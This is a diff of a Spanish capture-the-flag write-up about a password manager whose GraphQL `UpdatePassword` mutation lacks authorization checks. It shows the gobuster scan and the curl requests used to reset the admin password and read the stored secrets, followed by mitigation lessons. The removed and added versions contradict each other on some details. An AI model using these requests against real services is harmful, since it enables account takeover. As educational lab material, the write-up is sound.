@@ -11,113 +11,62 @@ tags: [web, graphql, idor, broken-access-control, source-review]
 
 [🇬🇧 English](README.en.md) | **Español**
 
-> **Estado:** Retired. Reto resuelto; sin flags reales.
+> **Estado:** Retired. Ficha de análisis; el flag no se publica.
 
-## TL;DR
+## Enunciado
 
-Gestor de contraseñas con **código fuente** y una API **GraphQL**. La mutación `UpdatePassword` no comprueba a quién pertenece la cuenta: **IDOR / control de acceso roto**. Cambiando la contraseña del usuario `admin` se entra en su cuenta, y ahí está la flag guardada como contraseña.
-
-## Enunciado y superficie
-
-«Pandora sospecha que hay un topo en el ministerio y necesita la contraseña maestra, que está en un gestor de contraseñas». Se entrega el código y hay un `entrypoint.sh` que siembra la base de datos.
+Un gestor de contraseñas con API **GraphQL**. Se entrega (o se publica) el **código fuente** de la aplicación, así que el reto es de revisión, no de fuerza bruta.
 
 ## Reconocimiento
 
-- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».
-
-## Análisis del código
-
-- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».
-
-## Explicación del fallo
-
 ```bash
-unzip passman.zip && cd passman
-cat entrypoint.sh
-grep -rn "GraphQL\|mutation\|UpdatePassword" --include=*.js .
+gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
 ```
 
-En `entrypoint.sh` se ve el `INSERT` inicial: el usuario `admin` existe con una contraseña que es la propia flag, y hay una tabla `saved_passwords` con una entrada suya.
+- `/` sirve el frontend; `/graphql` expone el esquema.
+- Con el código en mano, el esquema se lee directamente en los resolvers y en `schema.graphql`.
 
-```javascript
-// helpers/GraphqlHelper.js
-UpdatePassword: {
-  type: ResponseType,
-  args: { username: { type: new GraphQLNonNull(GraphQLString) },
-          password: { type: new GraphQLNonNull(GraphQLString) } },
-  resolve: async (root, args, request) => {
-    // no ownership check, no JWT verification for the target user
-    return db.updatePassword(args.username, args.password);
+## El fallo: `UpdatePassword` sin autorización
+
+En el fichero de mutaciones hay una operación que cambia la contraseña de un usuario recibiendo su nombre de usuario y la nueva contraseña, **sin comprobar quién llama** y sin pedir la contraseña actual:
+
+```graphql
+mutation {
+  UpdatePassword(username: "admin", password: "<NEW_PASS>") {
+    message
   }
 }
 ```
 
-La mutación acepta cualquier `username` y no compara con la identidad del token: se puede cambiar la contraseña de otro.
-
-## Reproducción local
-
-- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.
-
-## Explotación
-
-1. **Registro y login** para obtener un JWT válido:
+No es un IDOR de lectura: es una **mutación de escritura sin control de acceso**. Con ella se toma la cuenta de `admin`.
 
 ```bash
-curl -s -X POST http://<IP>:<puerto>/graphql \
+curl -s http://<IP>:<PORT>/graphql \
   -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{ RegisterUser(email:\"a@a.a\",username:\"x\",password:\"x\"){ message } }"}'
+  -d '{"query":"mutation { UpdatePassword(username: \"admin\", password: \"<NEW_PASS>\") { message } }"}'
 ```
+
+## Entrar y leer el flag
+
+Se inicia sesión como `admin` con la contraseña nueva y el flag está **dentro del gestor**, asociado a la cuenta del administrador.
+
+> Cuidado con el señuelo: `entrypoint.sh` siembra en la base de datos un flag falso para que el reto «tenga» datos. El válido es el que aparece tras autenticarse como `admin`.
 
 ```bash
-TOKEN=$(curl -s -X POST http://<IP>:<puerto>/graphql \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{ LoginUser(username:\"x\",password:\"x\"){ token } }"}' \
-  | jq -r '.data.LoginUser.token')
+curl -s http://<IP>:<PORT>/graphql -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer <token>" \
+  -d '{"query":"{ getPhrase(username: \"admin\") { phrase } }"}'
 ```
 
-2. **Cambiar la contraseña de `admin`** con la mutación vulnerable:
+## Conclusiones
 
-```bash
-curl -s -X POST http://<IP>:<puerto>/graphql \
-  -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" \
-  -d '{"query":"mutation{ UpdatePassword(username:\"admin\",password:\"Pwned123!\"){ message } }"}'
-```
+- El vector es **GraphQL sin autorización en una mutación**, no un IDOR clásico de lectura.
+- La contraseña se cambia sin conocer la anterior ni verificar la identidad del solicitante.
+- El flag sembrado por el contenedor es ruido: sólo vale el de la cuenta de administrador.
 
-3. **Entrar como admin** y leer sus contraseñas guardadas:
+## Lecciones
 
-```bash
-curl -s -X POST http://<IP>:<puerto>/graphql \
-  -H 'Content-Type: application/json' \
-  -d '{"query":"mutation{ LoginUser(username:\"admin\",password:\"Pwned123!\"){ token } }"}'
-```
-
-Con el token de admin, la consulta de contraseñas guardadas devuelve la flag:
-
-```graphql
-{ getPhrase(username: "admin") { address username password } }
-```
-
-## Evidencia
-
-- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
-- Los valores reales viven en `private/` y no se publican.
-
-## Lecciones aprendidas
-
-- **Introspection**: si está deshabilitada, el código fuente da los nombres exactos de mutaciones y campos.
-- **JWT**: el token de usuario normal sirve para llamar a la mutación; no hace falta forjarlo.
-- **Formato**: GraphQL exige `Content-Type: application/json`; un `POST` de formulario devuelve error de sintaxis.
-- **Contraseña nueva**: cumple cualquier política que aplique el registro, o el `update` falla en silencio.
-
-- GraphQL no aporta autorización por sí solo: cada resolver debe comprobar el propietario del recurso.
-- Un `username` en los argumentos es una invitación a IDOR; debe salir del token, no del cliente.
-- La revisión de código encuentra esto en minutos; el escaneo automático, casi nunca.
-- Mitigación: derivar el usuario del JWT, comprobar propiedad en cada mutación y limitar la introspection en producción.
-
-## Mitigaciones y detección
-
-- Fijar el algoritmo esperado y validar firma, `iss`, `aud` y caducidad en cada petición.
-
-## Referencias
-
-- [node-jwt-prototype](../../knowledge/web/node-jwt-prototype.md)
+- En GraphQL hay que revisar cada mutación, no sólo las queries.
+- Cambiar credenciales debe exigir la contraseña actual y una sesión válida.
+- Un flag en el seed es una trampa habitual; el objetivo real está detrás de la autenticación.
+- Mitigación: autorización por resolver, `currentPassword` obligatoria y rate limiting en `/graphql`.
